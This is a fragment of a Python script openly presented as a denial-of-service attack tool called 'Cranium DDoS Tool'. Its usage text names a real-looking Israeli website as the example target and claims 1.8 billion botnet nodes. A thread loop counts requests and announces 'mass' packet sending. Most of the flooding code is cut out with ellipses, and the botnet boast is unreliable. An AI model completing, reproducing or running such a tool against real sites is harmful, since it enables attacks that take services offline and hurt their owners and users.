...
def usage():
	print 'Cranium DDoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: cranium (url)'
	print 'Example: cranium.py http://luthi.co.il/'
	print "\a"
print \
"""
                       %%%%%%%%%%%%%%%%%%%%%                       
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amounf of packets generated by Immortal Botnet --"
